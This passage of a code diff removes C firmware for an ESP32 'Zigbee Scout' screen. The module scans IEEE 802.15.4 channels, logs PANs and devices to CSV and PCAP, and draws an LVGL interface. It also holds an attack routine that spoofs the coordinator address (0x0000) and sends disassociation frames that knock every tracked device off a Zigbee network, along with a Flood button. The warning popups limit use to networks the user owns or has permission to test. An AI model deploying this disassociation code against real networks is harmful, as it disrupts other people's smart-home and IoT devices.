-                uint16_t pan = parsed.pan_id;
-
-                if (pan != 0xFFFF) {
-                    zgwd_pan_entry_t *pe = NULL;
-                    for (int i = 0; i < ctx->pan_count; i++) {
-                        if (ctx->pans[i].pan_id == pan) { pe = &ctx->pans[i]; break; }
-                    }
-                    if (!pe && ctx->pan_count < ZGWD_MAX_PANS) {
-                        pe = &ctx->pans[ctx->pan_count++];
-                        pe->pan_id    = pan;
-                        pe->channel   = ch;
-                        pe->rssi_min  = msg.rssi;
-                        pe->rssi_max  = msg.rssi;
-                    }
-                    if (pe) {
-                        if (msg.rssi < pe->rssi_min) pe->rssi_min = msg.rssi;
-                        if (msg.rssi > pe->rssi_max) pe->rssi_max = msg.rssi;
-                        pe->frame_count++;
-                        pe->frame_types |= parsed.frame_type;
-                        // Beacon payload enrichment
-                        if (parsed.frame_type == ZGWD_FT_BEACON && parsed.ext_pan_id) {
-                            pe->ext_pan_id    = parsed.ext_pan_id;
-                            pe->stack_profile = parsed.stack_profile;
-                            pe->router_cap    = parsed.router_cap;
-                            pe->end_dev_cap   = parsed.end_dev_cap;
-                        }
-                        // Track unique short addresses
-                        if (parsed.src_short != 0xFFFF && pe->device_count < ZGWD_MAX_DEVS_PER_PAN) {
-                            bool dup = false;
-                            for (int d = 0; d < pe->device_count; d++) {
-                                if (pe->devices[d] == parsed.src_short) { dup = true; break; }
-                            }
-                            if (!dup) pe->devices[pe->device_count++] = parsed.src_short;
-                        }
-                    }
-                }
-
-                bool sd_got = sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, portMAX_DELAY) == pdTRUE;
-                if (csv) {
-                    fprintf(csv, "%llu,%u,0x%04X,%d,%u,%u,%u,%llu,%u\n",
-                            (unsigned long long)ts, ch, (unsigned)pan,
-                            (int)msg.rssi, (unsigned)msg.lqi, (unsigned)msg.len,
-                            (unsigned)parsed.frame_type,
-                            (unsigned long long)parsed.ext_pan_id,
-                            (unsigned)parsed.stack_profile);
-                }
-                if (pcap) s_zgwd_pcap_write_frame(pcap, &msg, ts);
-                if (sd_got) xSemaphoreGive(sd_spi_mutex);
-            }
-        }
-
-        if ((ch_idx & 0x0F) == 0x0F) {
-            bool sd_fl = sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, portMAX_DELAY) == pdTRUE;
-            if (csv)  fflush(csv);
-            if (pcap) fflush(pcap);
-            if (sd_fl) xSemaphoreGive(sd_spi_mutex);
-        }
-
-        ch_idx = (ch_idx + 1) % num_ch;
-    }
-
-    esp_ieee802154_sleep();
-    esp_ieee802154_disable();
-
-zgwd_done:
-    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
-    if (csv)  { fflush(csv);  fclose(csv);  }
-    if (pcap) { fflush(pcap); fclose(pcap); }
-    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
-
-    ensure_wifi_mode();
-    apply_wifi_power_settings();
-
-    ESP_LOGI(TAG, "[ZGWD] Stopped. Frames:%d PANs:%d", ctx->frame_count, ctx->pan_count);
-
-    ctx->scanning = false;
-    ctx->task     = NULL;
-    vTaskDelete(NULL);
-}
-
-// Saved copy of selected PAN for detail/locator/flood screens
-static zgwd_pan_entry_t s_zgwd_sel_pan;
-
-// ── Helpers to make/style a small button ─────────────────────────────────────
-static lv_obj_t *s_zgwd_make_btn(lv_obj_t *parent, const char *label,
-                                  lv_color_t bg, lv_align_t align,
-                                  lv_coord_t x, lv_coord_t y,
-                                  lv_coord_t w, lv_coord_t h)
-{
-    lv_obj_t *btn = lv_btn_create(parent);
-    lv_obj_set_size(btn, w, h);
-    lv_obj_align(btn, align, x, y);
-    lv_obj_set_style_bg_color(btn, bg, LV_STATE_DEFAULT);
-    lv_obj_set_style_border_width(btn, 0, 0);
-    lv_obj_set_style_radius(btn, 6, 0);
-    lv_obj_t *lbl = lv_label_create(btn);
-    lv_label_set_text(lbl, label);
-    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(lbl, lv_color_white(), 0);
-    lv_obj_center(lbl);
-    return btn;
-}
-
-// ── Card tap → PAN detail ─────────────────────────────────────────────────────
-static void s_zgwd_card_tap_cb(lv_event_t *e)
-{
-    int idx = (int)(uintptr_t)lv_event_get_user_data(e);
-    zgwd_ctx_t *ctx = s_zgwd;
-    if (!ctx || idx < 0 || idx >= ctx->pan_count) return;
-    s_zgwd_sel_pan = ctx->pans[idx];   // copy before navigation clears s_zgwd
-    s_zgwd_saved_pan_count   = ctx->pan_count;
-    s_zgwd_saved_frame_count = ctx->frame_count;
-    if (ctx->pan_count > 0)
-        memcpy(s_zgwd_saved_pans, ctx->pans, ctx->pan_count * sizeof(zgwd_pan_entry_t));
-    show_zgwd_pan_detail(idx);
-}
-
-// ── UI timer ──────────────────────────────────────────────────────────────────
-static void s_zgwd_ui_timer_cb(lv_timer_t *t)
-{
-    (void)t;
-    zgwd_ctx_t *ctx = s_zgwd;
-    if (!ctx) return;
-
-    if (ctx->status_lbl) {
-        char sb[64];
-        if (ctx->scanning)
-            snprintf(sb, sizeof(sb), "%s Ch%u  Fr:%d  PANs:%d",
-                     ctx->active_mode ? "[ACTIVE]" : "[PASS]",
-                     ctx->current_channel, ctx->frame_count, ctx->pan_count);
-        else
-            snprintf(sb, sizeof(sb), "Stopped  Fr:%d  PANs:%d",
-                     ctx->frame_count, ctx->pan_count);
-        lv_label_set_text(ctx->status_lbl, sb);
-    }
-
-    if (ctx->pan_list && lv_obj_is_valid(ctx->pan_list)) {
-        lv_obj_clean(ctx->pan_list);
-        if (ctx->pan_count == 0) {
-            lv_obj_t *hint = lv_label_create(ctx->pan_list);
-            lv_label_set_text(hint, ctx->scanning ? "Scanning..." : "No PANs detected");
-            lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
-            lv_obj_set_style_text_color(hint, lv_color_make(120, 120, 120), 0);
-        }
-        for (int i = ctx->pan_count - 1; i >= 0; i--) {
-            zgwd_pan_entry_t *pe = &ctx->pans[i];
-            lv_obj_t *card = lv_obj_create(ctx->pan_list);
-            lv_obj_set_size(card, lv_pct(100), LV_SIZE_CONTENT);
-            lv_obj_set_style_pad_all(card, 5, 0);
-            lv_obj_set_style_pad_gap(card, 2, 0);
-            lv_obj_set_style_radius(card, 5, 0);
-            lv_obj_set_style_border_width(card, 1, 0);
-            lv_obj_set_style_border_color(card, lv_color_hex(0x00695C), 0);
-            lv_obj_set_style_bg_color(card, ui_card_color(), 0);
-            lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
-            lv_obj_add_flag(card, LV_OBJ_FLAG_CLICKABLE);
-            lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
-            lv_obj_add_event_cb(card, s_zgwd_card_tap_cb, LV_EVENT_CLICKED,
-                                (void*)(uintptr_t)i);
-
-            // Row 1: PAN ID + channel + frame count
-            const char *sp = pe->stack_profile == 1 ? " ZB" :
-                             pe->stack_profile == 2 ? " PRO" : "";
-            char r1[48];
-            snprintf(r1, sizeof(r1), "PAN 0x%04X  Ch%u  %u frm%s",
-                     pe->pan_id, pe->channel, (unsigned)pe->frame_count, sp);
-            lv_obj_t *l1 = lv_label_create(card);
-            lv_label_set_text(l1, r1);
-            lv_obj_set_style_text_font(l1, &lv_font_montserrat_12, 0);
-            lv_obj_set_style_text_color(l1, lv_color_hex(0x4DB6AC), 0);
-            lv_label_set_long_mode(l1, LV_LABEL_LONG_CLIP);
-            lv_obj_set_width(l1, lv_pct(100));
-
-            // Row 2: RSSI + device count + router/enddev flags
-            char r2[48];
-            snprintf(r2, sizeof(r2), "RSSI %d..%d  Devs:%u%s%s",
-                     (int)pe->rssi_min, (int)pe->rssi_max,
-                     (unsigned)pe->device_count,
-                     pe->router_cap    ? " R" : "",
-                     pe->end_dev_cap   ? " E" : "");
-            lv_obj_t *l2 = lv_label_create(card);
-            lv_label_set_text(l2, r2);
-            lv_obj_set_style_text_font(l2, &lv_font_montserrat_12, 0);
-            lv_obj_set_style_text_color(l2, lv_color_make(140, 140, 140), 0);
-            lv_label_set_long_mode(l2, LV_LABEL_LONG_CLIP);
-            lv_obj_set_width(l2, lv_pct(100));
-        }
-    }
-
-    // Restore buttons when scan stops
-    if (!ctx->scanning) {
-        if (ctx->passive_btn) {
-            lv_obj_t *lbl = lv_obj_get_child(ctx->passive_btn, 0);
-            if (lbl) lv_label_set_text(lbl, LV_SYMBOL_PLAY "  Passive");
-            lv_obj_clear_state(ctx->passive_btn, LV_STATE_DISABLED);
-        }
-        if (ctx->active_btn) {
-            lv_obj_clear_state(ctx->active_btn, LV_STATE_DISABLED);
-        }
-    }
-}
-
-// ── Passive / Active / Stop callbacks ────────────────────────────────────────
-static void s_zgwd_start(zgwd_ctx_t *ctx, bool active_mode)
-{
-    if (ctx->scanning || ctx->task) return;
-    ctx->scanning    = true;
-    ctx->active_mode = active_mode;
-    ctx->cancel      = false;
-    ctx->frame_count = 0;
-    ctx->pan_count   = 0;
-    memset(ctx->pans, 0, sizeof(ctx->pans));
-    s_zgwd_saved_pan_count   = 0;
-    s_zgwd_saved_frame_count = 0;
-    if (ctx->pan_list && lv_obj_is_valid(ctx->pan_list))
-        lv_obj_clean(ctx->pan_list);
-    // Disable both buttons while scanning; passive btn becomes Stop
-    if (ctx->passive_btn) {
-        lv_obj_t *lbl = lv_obj_get_child(ctx->passive_btn, 0);
-        if (lbl) lv_label_set_text(lbl, LV_SYMBOL_STOP "  Stop");
-    }
-    if (ctx->active_btn)
-        lv_obj_add_state(ctx->active_btn, LV_STATE_DISABLED);
-    xTaskCreate(s_zgwd_task_fn, "zgwd", 8192, ctx, 2, &ctx->task);
-}
-
-static void s_zgwd_passive_cb(lv_event_t *e)
-{
-    (void)e;
-    zgwd_ctx_t *ctx = s_zgwd;
-    if (!ctx) return;
-    if (ctx->scanning) {
-        ctx->cancel   = true;
-        ctx->scanning = false;
-    } else {
-        s_zgwd_start(ctx, false);
-    }
-}
-
-static void s_zgwd_popup_dismiss_cb(lv_event_t *e)
-{
-    lv_obj_t *popup = (lv_obj_t *)lv_event_get_user_data(e);
-    if (popup && lv_obj_is_valid(popup)) lv_obj_del(popup);
-}
-
-static void s_zgwd_active_disclaimer_ok_cb(lv_event_t *e)
-{
-    lv_obj_t *popup = (lv_obj_t *)lv_event_get_user_data(e);
-    lv_obj_del(popup);
-    zgwd_ctx_t *ctx = s_zgwd;
-    if (ctx) s_zgwd_start(ctx, true);
-}
-
-static void s_zgwd_active_cb(lv_event_t *e)
-{
-    (void)e;
-    zgwd_ctx_t *ctx = s_zgwd;
-    if (!ctx || ctx->scanning) return;
-
-    // Disclaimer popup
-    lv_obj_t *popup = lv_obj_create(lv_scr_act());
-    lv_obj_set_size(popup, 220, 160);
-    lv_obj_center(popup);
-    lv_obj_set_style_bg_color(popup, lv_color_hex(0x1A1A1A), 0);
-    lv_obj_set_style_border_color(popup, lv_color_hex(0xB71C1C), 0);
-    lv_obj_set_style_border_width(popup, 2, 0);
-    lv_obj_set_style_radius(popup, 8, 0);
-    lv_obj_set_style_pad_all(popup, 10, 0);
-    lv_obj_clear_flag(popup, LV_OBJ_FLAG_SCROLLABLE);
-
-    lv_obj_t *ttl = lv_label_create(popup);
-    lv_label_set_text(ttl, "! ACTIVE SCAN WARNING");
-    lv_obj_set_style_text_font(ttl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(ttl, lv_color_hex(0xEF5350), 0);
-    lv_obj_align(ttl, LV_ALIGN_TOP_MID, 0, 0);
-
-    lv_obj_t *msg = lv_label_create(popup);
-    lv_label_set_text(msg, "Active mode transmits 802.15.4\nbeacon requests. Use only on\nnetworks you own or have\nexplicit written permission\nto test.");
-    lv_obj_set_style_text_font(msg, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(msg, lv_color_hex(0xCCCCCC), 0);
-    lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 18);
-    lv_label_set_long_mode(msg, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(msg, 200);
-
-    lv_obj_t *ok_btn = lv_btn_create(popup);
-    lv_obj_set_size(ok_btn, 90, 28);
-    lv_obj_align(ok_btn, LV_ALIGN_BOTTOM_RIGHT, 0, 0);
-    lv_obj_set_style_bg_color(ok_btn, lv_color_hex(0xB71C1C), LV_STATE_DEFAULT);
-    lv_obj_set_style_radius(ok_btn, 5, 0);
-    lv_obj_t *ok_lbl = lv_label_create(ok_btn);
-    lv_label_set_text(ok_lbl, "Proceed");
-    lv_obj_set_style_text_font(ok_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(ok_lbl, lv_color_white(), 0);
-    lv_obj_center(ok_lbl);
-    lv_obj_add_event_cb(ok_btn, s_zgwd_active_disclaimer_ok_cb, LV_EVENT_CLICKED, popup);
-
-    lv_obj_t *cancel_btn = lv_btn_create(popup);
-    lv_obj_set_size(cancel_btn, 90, 28);
-    lv_obj_align(cancel_btn, LV_ALIGN_BOTTOM_LEFT, 0, 0);
-    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x424242), LV_STATE_DEFAULT);
-    lv_obj_set_style_radius(cancel_btn, 5, 0);
-    lv_obj_t *can_lbl = lv_label_create(cancel_btn);
-    lv_label_set_text(can_lbl, "Cancel");
-    lv_obj_set_style_text_font(can_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(can_lbl, lv_color_white(), 0);
-    lv_obj_center(can_lbl);
-    lv_obj_add_event_cb(cancel_btn, s_zgwd_popup_dismiss_cb, LV_EVENT_CLICKED, popup);
-}
-
-static void zgwd_scout_stop(void)
-{
-    if (s_zgwd) {
-        s_zgwd->cancel = true; s_zgwd->scanning = false;
-        s_zgwd->status_lbl  = NULL; s_zgwd->pan_list   = NULL;
-        s_zgwd->passive_btn = NULL; s_zgwd->active_btn = NULL;
-        if (s_zgwd->tmr) { lv_timer_del(s_zgwd->tmr); s_zgwd->tmr = NULL; }
-        if (!s_zgwd->task) { heap_caps_free(s_zgwd); s_zgwd = NULL; }
-    }
-}
-
-// ── Main Zigbee Scout screen ──────────────────────────────────────────────────
-static void show_zigbee_wardrive_screen(void)
-{
-    if (!s_zgwd_rx_q)
-        s_zgwd_rx_q = xQueueCreate(ZGWD_Q_DEPTH, sizeof(zgwd_frame_msg_t));
-
-    zgwd_ctx_t *ctx = heap_caps_calloc(1, sizeof(zgwd_ctx_t), MALLOC_CAP_SPIRAM);
-    if (!ctx) { ESP_LOGE(TAG, "[ZGWD] OOM"); return; }
-
-    create_function_page_base("Zigbee Scout");
-    g_screen_stop_fn = zgwd_scout_stop;
-    s_zgwd = ctx;
-    if (s_zgwd_saved_pan_count > 0) {
-        ctx->pan_count   = s_zgwd_saved_pan_count;
-        ctx->frame_count = s_zgwd_saved_frame_count;
-        memcpy(ctx->pans, s_zgwd_saved_pans, s_zgwd_saved_pan_count * sizeof(zgwd_pan_entry_t));
-    }
-    apply_menu_bg();
-
-    ctx->status_lbl = lv_label_create(function_page);
-    lv_label_set_text(ctx->status_lbl, "802.15.4 Ch 11-26  |  Tap card for details");
-    lv_obj_set_style_text_font(ctx->status_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(ctx->status_lbl, lv_color_hex(0x42A5F5), 0);
-    lv_label_set_long_mode(ctx->status_lbl, LV_LABEL_LONG_CLIP);
-    lv_obj_set_width(ctx->status_lbl, LCD_H_RES - 8);
-    lv_obj_align(ctx->status_lbl, LV_ALIGN_TOP_LEFT, 4, 32);
-
-    // Scrollable PAN list — shrunk to leave room for two button rows
-    ctx->pan_list = lv_obj_create(function_page);
-    lv_obj_set_size(ctx->pan_list, LCD_H_RES, LCD_V_RES - 50 - 36 - 36 - 4);
-    lv_obj_align(ctx->pan_list, LV_ALIGN_TOP_MID, 0, 50);
-    lv_obj_set_style_bg_color(ctx->pan_list, ui_bg_color(), 0);
-    lv_obj_set_style_border_color(ctx->pan_list, lv_color_hex(0x00695C), 0);
-    lv_obj_set_style_border_width(ctx->pan_list, 1, 0);
-    lv_obj_set_style_border_side(ctx->pan_list, LV_BORDER_SIDE_TOP | LV_BORDER_SIDE_BOTTOM, 0);
-    lv_obj_set_style_radius(ctx->pan_list, 0, 0);
-    lv_obj_set_style_pad_all(ctx->pan_list, 3, 0);
-    lv_obj_set_style_pad_gap(ctx->pan_list, 3, 0);
-    lv_obj_set_flex_flow(ctx->pan_list, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_scrollbar_mode(ctx->pan_list, LV_SCROLLBAR_MODE_AUTO);
-
-    lv_obj_t *hint0 = lv_label_create(ctx->pan_list);
-    lv_label_set_text(hint0, "Press a Start button to scan");
-    lv_obj_set_style_text_font(hint0, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(hint0, lv_color_make(120, 120, 120), 0);
-
-    // Passive button (teal, left half)
-    ctx->passive_btn = s_zgwd_make_btn(function_page,
-        LV_SYMBOL_PLAY "  Passive", lv_color_hex(0x00695C),
-        LV_ALIGN_BOTTOM_LEFT, 8, -38, (LCD_H_RES/2) - 12, 32);
-    lv_obj_add_event_cb(ctx->passive_btn, s_zgwd_passive_cb, LV_EVENT_CLICKED, NULL);
-
-    // Active button (red, right half)
-    ctx->active_btn = s_zgwd_make_btn(function_page,
-        LV_SYMBOL_WARNING "  Active", lv_color_hex(0xB71C1C),
-        LV_ALIGN_BOTTOM_RIGHT, -8, -38, (LCD_H_RES/2) - 12, 32);
-    lv_obj_add_event_cb(ctx->active_btn, s_zgwd_active_cb, LV_EVENT_CLICKED, NULL);
-
-    // Bottom "< Home" removed — top-bar ‹ Back exits; generic teardown
-    // (reset_function_page_children) cancels the s_zgwd scan on any exit.
-
-    ctx->tmr = lv_timer_create(s_zgwd_ui_timer_cb, 500, NULL);
-}
-
-// ── PAN detail screen ─────────────────────────────────────────────────────────
-static void s_zgwd_da_poll_timer_cb(lv_timer_t *t)
-{
-    int r = s_zgwd_da_result;
-    if (r == -1 || r == 0) return;  // still running or idle
-    lv_timer_del(t);
-    if (!s_zgwd_da_lbl || !lv_obj_is_valid(s_zgwd_da_lbl)) { s_zgwd_da_result = 0; return; }
-    char buf[56];
-    if (r > 0)
-        snprintf(buf, sizeof(buf), "Sent disassoc to %d device(s)", r);
-    else
-        snprintf(buf, sizeof(buf), "Radio enable failed");
-    lv_label_set_text(s_zgwd_da_lbl, buf);
-    lv_obj_set_style_text_color(s_zgwd_da_lbl,
-        r > 0 ? lv_color_hex(0x66BB6A) : lv_color_hex(0xEF5350), 0);
-    s_zgwd_da_result = 0;
-}
-
-static void s_zgwd_detail_back_cb(lv_event_t *e) { (void)e; show_zigbee_wardrive_screen(); }
-
-// Disassoc task — stop WiFi, enable 802.15.4, send, disable, restart WiFi
-static void s_zgwd_disassoc_task_fn(void *arg)
-{
-    zgwd_pan_entry_t *pe = (zgwd_pan_entry_t *)arg;
-    int sent = 0;
-
-    if (current_radio_mode == RADIO_MODE_WIFI) {
-        esp_wifi_set_promiscuous(false);
-        esp_wifi_stop(); esp_wifi_deinit();
-        wifi_initialized = false;
-        current_radio_mode = RADIO_MODE_NONE;
-    }
-
-    if (!s_zgwd_tx_sem) s_zgwd_tx_sem = xSemaphoreCreateBinary();
-
-    if (g_led_strip) { led_strip_clear(g_led_strip); vTaskDelay(pdMS_TO_TICKS(100)); }
-
-    if (esp_ieee802154_enable() == ESP_OK) {
-        esp_ieee802154_set_promiscuous(false);
-        esp_ieee802154_set_coordinator(false);
-        esp_ieee802154_set_panid(pe->pan_id);
-        esp_ieee802154_set_short_address(0x0000);  // spoof coordinator
-        esp_ieee802154_set_channel(pe->channel);
-        for (int i = 0; i < pe->device_count; i++) {
-            for (int r = 0; r < 3; r++) {
-                s_zgwd_send_disassoc(pe->pan_id, pe->devices[i]);
-                vTaskDelay(pdMS_TO_TICKS(50));
-            }
-            sent++;
-            ESP_LOGI(TAG, "[ZGWD] Disassoc sent to 0x%04X on PAN 0x%04X",
-                     pe->devices[i], pe->pan_id);
-        }
-        esp_ieee802154_sleep();
-        esp_ieee802154_disable();
-    }
-
-    ensure_wifi_mode();
-    apply_wifi_power_settings();
-    s_zgwd_da_result = (sent > 0) ? sent : -2;  // -2 = enable failed
-    vTaskDelete(NULL);
-}
-
-static void s_zgwd_disassoc_proceed_cb(lv_event_t *e)
-{
-    lv_obj_t *popup = (lv_obj_t *)lv_event_get_user_data(e);
-    if (popup && lv_obj_is_valid(popup)) lv_obj_del(popup);
-
-    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
-    if (pe->device_count == 0) {
-        if (s_zgwd_da_lbl && lv_obj_is_valid(s_zgwd_da_lbl)) {
-            lv_label_set_text(s_zgwd_da_lbl, "No tracked devices (active scan finds more)");
-            lv_obj_set_style_text_color(s_zgwd_da_lbl, lv_color_hex(0xFF8F00), 0);
-        }
-        return;
-    }
-    if (s_zgwd_da_lbl && lv_obj_is_valid(s_zgwd_da_lbl)) {
-        lv_label_set_text(s_zgwd_da_lbl, "Sending disassoc frames...");
-        lv_obj_set_style_text_color(s_zgwd_da_lbl, lv_color_hex(0x42A5F5), 0);
-    }
-    s_zgwd_da_result = -1;
-    static zgwd_pan_entry_t da_pan_copy;
-    da_pan_copy = *pe;
-    xTaskCreate(s_zgwd_disassoc_task_fn, "zgwd_da", 3072, &da_pan_copy, 2, NULL);
-}
-
-static void s_zgwd_disassoc_all_cb(lv_event_t *e)
-{
-    (void)e;
-
-    lv_obj_t *popup = lv_obj_create(lv_scr_act());
-    lv_obj_set_size(popup, 220, 170);
-    lv_obj_center(popup);
-    lv_obj_set_style_bg_color(popup, lv_color_hex(0x1A1A1A), 0);
-    lv_obj_set_style_border_color(popup, lv_color_hex(0xB71C1C), 0);
-    lv_obj_set_style_border_width(popup, 2, 0);
-    lv_obj_set_style_radius(popup, 8, 0);
-    lv_obj_set_style_pad_all(popup, 10, 0);
-    lv_obj_clear_flag(popup, LV_OBJ_FLAG_SCROLLABLE);
-
-    lv_obj_t *ttl = lv_label_create(popup);
-    lv_label_set_text(ttl, "! DISASSOCIATION WARNING");
-    lv_obj_set_style_text_font(ttl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(ttl, lv_color_hex(0xEF5350), 0);
-    lv_obj_align(ttl, LV_ALIGN_TOP_MID, 0, 0);
-
-    lv_obj_t *msg = lv_label_create(popup);
-    lv_label_set_text(msg, "This transmits 802.15.4 frames\nthat force devices off the\nnetwork. Only use on networks\nyou own or have explicit\nwritten permission to test.");
-    lv_obj_set_style_text_font(msg, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(msg, lv_color_hex(0xCCCCCC), 0);
-    lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 18);
-    lv_label_set_long_mode(msg, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(msg, 200);
-
-    lv_obj_t *ok_btn = lv_btn_create(popup);
-    lv_obj_set_size(ok_btn, 90, 28);
-    lv_obj_align(ok_btn, LV_ALIGN_BOTTOM_RIGHT, 0, 0);
-    lv_obj_set_style_bg_color(ok_btn, lv_color_hex(0xB71C1C), LV_STATE_DEFAULT);
-    lv_obj_set_style_radius(ok_btn, 5, 0);
-    lv_obj_t *ok_lbl = lv_label_create(ok_btn);
-    lv_label_set_text(ok_lbl, "Proceed");
-    lv_obj_set_style_text_font(ok_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(ok_lbl, lv_color_white(), 0);
-    lv_obj_center(ok_lbl);
-    lv_obj_add_event_cb(ok_btn, s_zgwd_disassoc_proceed_cb, LV_EVENT_CLICKED, popup);
-
-    lv_obj_t *cancel_btn = lv_btn_create(popup);
-    lv_obj_set_size(cancel_btn, 90, 28);
-    lv_obj_align(cancel_btn, LV_ALIGN_BOTTOM_LEFT, 0, 0);
-    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x424242), LV_STATE_DEFAULT);
-    lv_obj_set_style_radius(cancel_btn, 5, 0);
-    lv_obj_t *can_lbl = lv_label_create(cancel_btn);
-    lv_label_set_text(can_lbl, "Cancel");
-    lv_obj_set_style_text_font(can_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(can_lbl, lv_color_white(), 0);
-    lv_obj_center(can_lbl);
-    lv_obj_add_event_cb(cancel_btn, s_zgwd_popup_dismiss_cb, LV_EVENT_CLICKED, popup);
-}
-
-static void s_zgwd_go_locate_cb(lv_event_t *e) { (void)e; show_zgwd_locator(0); }
-static void s_zgwd_go_flood_cb(lv_event_t *e)  { (void)e; show_zgwd_flood(0);   }
-
-static void s_zgwd_detail_addrow(lv_obj_t *parent, const char *text,
-                                  lv_color_t col, int y)
-{
-    lv_obj_t *l = lv_label_create(parent);
-    lv_label_set_text(l, text);
-    lv_obj_set_style_text_font(l, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(l, col, 0);
-    lv_label_set_long_mode(l, LV_LABEL_LONG_CLIP);
-    lv_obj_set_width(l, LCD_H_RES - 8);
-    lv_obj_align(l, LV_ALIGN_TOP_LEFT, 4, y);
-}
-
-static void zgwd_pan_detail_stop(void)
-{
-    // Timer handle is not stored; callback guards with lv_obj_is_valid().
-    // Nulling s_zgwd_da_lbl makes the guard fail, stopping all LVGL writes.
-    s_zgwd_da_lbl    = NULL;
-    s_zgwd_da_result = 0;
-}
-
-static void show_zgwd_pan_detail(int pan_idx)
-{
-    (void)pan_idx;
-    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
-
-    create_function_page_base("PAN Detail");
-    g_screen_stop_fn = zgwd_pan_detail_stop;
-    apply_menu_bg();
-
-    int y = 32;
-    char buf[64];
-
-    snprintf(buf, sizeof(buf), "PAN  0x%04X   Channel %u", pe->pan_id, pe->channel);
-    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0x4DB6AC), y); y += 18;
-
-    if (pe->ext_pan_id) {
-        snprintf(buf, sizeof(buf), "Ext PAN  %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X",
-                 (uint8_t)(pe->ext_pan_id),       (uint8_t)(pe->ext_pan_id >> 8),
-                 (uint8_t)(pe->ext_pan_id >> 16),  (uint8_t)(pe->ext_pan_id >> 24),
-                 (uint8_t)(pe->ext_pan_id >> 32),  (uint8_t)(pe->ext_pan_id >> 40),
-                 (uint8_t)(pe->ext_pan_id >> 48),  (uint8_t)(pe->ext_pan_id >> 56));
-        s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0x80DEEA), y); y += 18;
-    }
-
-    const char *sp_str = pe->stack_profile == 1 ? "Zigbee" :
-                         pe->stack_profile == 2 ? "ZigbeePRO" : "Unknown";
-    snprintf(buf, sizeof(buf), "Stack: %s  Router:%s  EndDev:%s",
-             sp_str, pe->router_cap ? "Y" : "N", pe->end_dev_cap ? "Y" : "N");
-    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0xB0BEC5), y); y += 18;
-
-    snprintf(buf, sizeof(buf), "RSSI %d..%d dBm   Frames: %u",
-             (int)pe->rssi_min, (int)pe->rssi_max, (unsigned)pe->frame_count);
-    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0xB0BEC5), y); y += 18;
-
-    snprintf(buf, sizeof(buf), "Devices seen: %u", (unsigned)pe->device_count);
-    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0xB0BEC5), y); y += 18;
-    for (int i = 0; i < pe->device_count && i < 6; i++) {
-        snprintf(buf, sizeof(buf), "  0x%04X", pe->devices[i]);
-        s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0x78909C), y); y += 16;
-    }
-    if (pe->device_count > 6) {
-        s_zgwd_detail_addrow(function_page, "  ...more", lv_color_hex(0x78909C), y);
-        y += 16;
-    }
-
-    y += 6;
-    int btn_w = (LCD_H_RES - 24) / 3;
-
-    lv_obj_t *loc_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_BELL " Locate",
-        lv_color_hex(0x1565C0), LV_ALIGN_TOP_LEFT, 8, y, btn_w, 30);
-    lv_obj_add_event_cb(loc_btn, s_zgwd_go_locate_cb, LV_EVENT_CLICKED, NULL);
-
-    // Disassoc result label (appears below action row)
-    s_zgwd_da_lbl = lv_label_create(function_page);
-    lv_label_set_text(s_zgwd_da_lbl, pe->device_count == 0 ?
-        "No devices tracked (active scan finds more)" : "");
-    lv_obj_set_style_text_font(s_zgwd_da_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(s_zgwd_da_lbl, lv_color_hex(0x78909C), 0);
-    lv_label_set_long_mode(s_zgwd_da_lbl, LV_LABEL_LONG_WRAP);
-    lv_obj_set_width(s_zgwd_da_lbl, LCD_H_RES - 16);
-    lv_obj_align(s_zgwd_da_lbl, LV_ALIGN_TOP_LEFT, 8, y + 36);
-
-    lv_obj_t *da_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_WARNING " Disassoc",
-        lv_color_hex(0xB71C1C), LV_ALIGN_TOP_MID, 0, y, btn_w, 30);
-    lv_obj_add_event_cb(da_btn, s_zgwd_disassoc_all_cb, LV_EVENT_CLICKED, NULL);
-
-    lv_obj_t *fl_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_REFRESH " Flood",
-        lv_color_hex(0x6A1B9A), LV_ALIGN_TOP_RIGHT, -8, y, btn_w, 30);
-    lv_obj_add_event_cb(fl_btn, s_zgwd_go_flood_cb, LV_EVENT_CLICKED, NULL);
-
-    // Back
-    lv_obj_t *back = lv_btn_create(function_page);
-    lv_obj_set_size(back, LCD_H_RES - 16, 30);
-    lv_obj_align(back, LV_ALIGN_BOTTOM_MID, 0, -4);
-    lv_obj_set_style_bg_color(back, ui_panel_color(), LV_STATE_DEFAULT);
